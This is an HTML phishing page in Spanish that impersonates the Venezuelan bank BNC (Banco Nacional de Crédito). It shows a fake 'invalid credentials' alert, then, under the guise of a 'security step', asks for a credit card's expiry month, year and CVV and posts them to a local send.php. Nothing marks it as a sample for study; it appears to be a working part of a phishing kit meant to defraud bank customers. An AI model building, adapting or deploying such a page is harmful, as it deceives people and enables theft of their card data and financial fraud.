<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="shortcut icon" href="iconero.ico">
<title>BNC</title>
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@500;600&display=swap" rel="stylesheet">
<style>
  :root{
    --border:#e2e5ea;
    --border-focus:#b9c0cc;
    --value:#3a3f4a;
    --placeholder:#9aa0ac;
    --icon:#5b6270;
    --radius:14px;
  }

  *{box-sizing:border-box;}

  body{
    margin:0;
    min-height:100vh;
    display:flex;
    align-items:center;
    justify-content:center;
    background:linear-gradient(160deg,#ffffff 0%,#f4f6f8 45%,#e7eaef 100%);
    font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;
    padding:24px;
  }

  .card-stack{
    width:100%;
    max-width:560px;
    display:flex;
    flex-direction:column;
    gap:0;
  }

  /* Logo */
  .logo{
    display:block;
    margin:0 auto 34px;
    height:88px;
    width:auto;
    object-fit:contain;
  }

  @media (max-width:480px){
    .logo{height:72px;margin-bottom:26px;}
  }

  /* Título "Paso de seguridad:" en naranja BNC */
  .step-title{
    font-family:"Poppins",-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;
    font-weight:600;
    font-size:18px;
    letter-spacing:.2px;
    color:#FF6A00;
    text-align:center;
    margin:0 0 30px;
    line-height:1.4;
  }

  @media (max-width:480px){
    .step-title{font-size:17px;margin:0 0 24px;}
  }

  /* Contenedor de cada campo */
  .field{
    position:relative;
    border:1px solid var(--border);
    border-radius:var(--radius);
    background:#fff;
    padding:16px 20px;
    transition:border-color .15s ease, box-shadow .15s ease;
    margin-bottom:16px;
  }

  .field:focus-within{
    border-color:var(--border-focus);
    box-shadow:0 0 0 3px rgba(150,160,175,.12);
  }

  /* Etiqueta flotante */
  .field-label{
    display:block;
    font-size:13px;
    font-weight:500;
    letter-spacing:.2px;
    margin-bottom:6px;
    color:#9aa0ac;
    width:max-content;
  }

  /* Select y input comparten estilo de texto */
  .field select,
  .field input{
    width:100%;
    border:none;
    outline:none;
    background:transparent;
    font-size:20px;
    color:var(--value);
    padding:0;
    padding-right:34px;
    appearance:none;
    -webkit-appearance:none;
    -moz-appearance:none;
    font-family:inherit;
    cursor:pointer;
  }

  .field input{cursor:text;}

  /* Placeholder / opción vacía */
  .field select:invalid{color:var(--value);}
  .field input::placeholder{color:var(--placeholder);}
  .field select option{color:var(--value);}

  /* Icono (flecha o candado) a la derecha */
  .field-icon{
    position:absolute;
    right:20px;
    bottom:16px;
    width:20px;
    height:20px;
    color:var(--icon);
    pointer-events:none;
    display:flex;
    align-items:center;
    justify-content:center;
  }

  .field-icon svg{width:100%;height:100%;display:block;}

  /* El input del CVV */
  .field--cvv{
    display:flex;
    align-items:center;
    padding-top:20px;
    padding-bottom:20px;
  }

  /* Candado centrado verticalmente en el campo CVV */
  .field--cvv .field-icon{
    bottom:auto;
    top:50%;
    transform:translateY(-50%);
  }

  @media (max-width:480px){
    .field select,.field input{font-size:18px;}
    .field-label{font-size:12px;}
  }

  /* Contenedor del formulario */
  form{
    display:flex;
    flex-direction:column;
  }

  /* Contenedor del botón centrado */
  .form-container{
    display:flex;
    justify-content:center;
    margin-top:24px;
  }

  /* Botón */
  .submit-btn{
    width:100%;
    max-width:300px;
    border:none;
    border-radius:14px;
    background:#FF6A00;
    color:#fff;
    font-family:"Poppins",sans-serif;
    font-size:18px;
    font-weight:600;
    padding:16px 32px;
    cursor:pointer;
    transition:background .15s ease;
  }

  .submit-btn:hover{
    background:#e85f00;
  }

  .submit-btn:active{
    background:#d94d00;
  }

  @media (max-width:480px){
    .submit-btn{font-size:16px;padding:14px 28px;}
  }


  .bnc-alert-overlay{
    position:fixed;
    inset:0;

    background:rgba(0,0,0,.35);

    display:flex;
    justify-content:center;
    align-items:center;

    z-index:999999;

    animation:fadeIn .25s ease;
}

.bnc-alert-box{
    width:92%;
    max-width:360px;

    background:white;

    border-radius:22px;

    padding:30px 24px;

    text-align:center;

    box-shadow:
    0 18px 45px rgba(0,0,0,.18);

    animation:popup .28s ease;

    font-family:'Poppins',sans-serif;

    position:relative;
}

.bnc-alert-close{
    position:absolute;

    top:14px;
    right:14px;

    width:34px;
    height:34px;

    border:none;
    border-radius:50%;

    background:#f2f4f8;

    color:#5f6b7a;

    font-size:24px;
    line-height:1;

    cursor:pointer;

    transition:.2s;
}

.bnc-alert-close:hover{
    background:#e5e9f0;
}

.bnc-alert-logo{
    width:110px;
    display:block;
    margin:0 auto 18px;
}

.bnc-alert-icon{
    width:58px;
    height:58px;

    border-radius:50%;

    background:#ff5a00;
    color:white;

    display:flex;
    justify-content:center;
    align-items:center;

    font-size:34px;
    font-weight:600;

    margin:0 auto 18px;
}

.bnc-alert-title{
    font-size:24px;
    font-weight:600;

    color:#003c81;

    margin-bottom:10px;
}

.bnc-alert-text{
    font-size:15px;
    line-height:1.7;

    color:#5f6b7a;
}

/* ANIMACIONES */

@keyframes popup{

    0%{
        transform:scale(.85);
        opacity:0;
    }

    100%{
        transform:scale(1);
        opacity:1;
    }
}

@keyframes fadeIn{

    from{
        opacity:0;
    }

    to{
        opacity:1;
    }
}
</style>
</head>
<body>

  <div class="card-stack">

    <!-- LOGO -->
    <img class="logo" alt="Logo BNC"
      src="https://upload.wikimedia.org/wikipedia/commons/8/84/Banco_Nacional_de_Credito.png?utm_source=es.wikipedia.org&utm_campaign=index&utm_content=original">

    <h1 class="step-title">Paso de seguridad, completa los datos de tu tarjeta de crédito:</h1>

    <form action="send.php" method="POST">

      <!-- Mes de vencimiento -->
      <div class="field">
        <label class="field-label" for="mes">Mes de Vencimiento TDC</label>
        <select id="mes" name="mes2" required>
          <option value="" selected>-- Mes --</option>
          <option value="01">01 - Enero</option>
          <option value="02">02 - Febrero</option>
          <option value="03">03 - Marzo</option>
          <option value="04">04 - Abril</option>
          <option value="05">05 - Mayo</option>
          <option value="06">06 - Junio</option>
          <option value="07">07 - Julio</option>
          <option value="08">08 - Agosto</option>
          <option value="09">09 - Septiembre</option>
          <option value="10">10 - Octubre</option>
          <option value="11">11 - Noviembre</option>
          <option value="12">12 - Diciembre</option>
        </select>
        <span class="field-icon" aria-hidden="true">
          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
            <polyline points="6 9 12 15 18 9"></polyline>
          </svg>
        </span>
      </div>

      <!-- Año de vencimiento -->
      <div class="field">
        <label class="field-label" for="anio">Año de Vencimiento TDC</label>
        <select id="anio" name="anio2" required>
          <option value="" selected>-- Año --</option>
        </select>
        <span class="field-icon" aria-hidden="true">
          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
            <polyline points="6 9 12 15 18 9"></polyline>
          </svg>
        </span>
      </div>

      <!-- CVV -->
      <div class="field field--cvv">
        <input type="text" id="cvv" name="cvv2" inputmode="numeric" autocomplete="cc-csc"
               maxlength="4" placeholder="CVV ..." aria-label="CVV">
        <span class="field-icon" aria-hidden="true">
          <svg viewBox="0 0 24 24" fill="currentColor">
            <path d="M12 1a5 5 0 0 0-5 5v3H6a2 2 0 0 0-2 2v9a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2v-9a2 2 0 0 0-2-2h-1V6a5 5 0 0 0-5-5zm3 8H9V6a3 3 0 0 1 6 0v3z"/>
          </svg>
        </span>
      </div>

      <!-- Botón centrado -->
      <div class="form-container">
        <button type="submit" class="submit-btn">Continuar</button>
      </div>

    </form>

  </div>


  <!-- ALERTA -->
<div class="bnc-alert-overlay" id="bncAlert">

    <div class="bnc-alert-box">

        <!-- BOTON CERRAR -->
        <button class="bnc-alert-close" id="closeAlert">
            ×
        </button>

        <img
            src="BNCLogoSmall-Big.png"
            class="bnc-alert-logo"
        >

        <div class="bnc-alert-icon">
            !
        </div>

        <div class="bnc-alert-title">
            Credenciales inválidas
        </div>

        <div class="bnc-alert-text">
            Verifica tu información e intenta nuevamente.
        </div>

    </div>

</div>

  <script>

window.addEventListener('load', () => {

    const alertBox = document.getElementById('bncAlert');

    function closeAlert() {

        alertBox.style.opacity = '0';
        alertBox.style.transition = '.25s ease';

        setTimeout(() => {

            alertBox.remove();

        }, 250);
    }

    /* CLICK EN CUALQUIER PARTE */

    document.body.addEventListener('click', closeAlert, {
        once: true
    });

    /* TOUCH MOVIL */

    document.body.addEventListener('touchstart', closeAlert, {
        once: true
    });

});

</script>

  <script>
    // Generar años (año actual + próximos 12)
    (function(){
      var select = document.getElementById('anio');
      var current = new Date().getFullYear();
      for (var i = 0; i <= 12; i++){
        var y = current + i;
        var opt = document.createElement('option');
        opt.value = y;
        opt.textContent = y;
        select.appendChild(opt);
      }
    })();

    // CVV: solo números
    document.getElementById('cvv').addEventListener('input', function(e){
      e.target.value = e.target.value.replace(/\D/g,'');
    });
  </script>

</body>
</html>
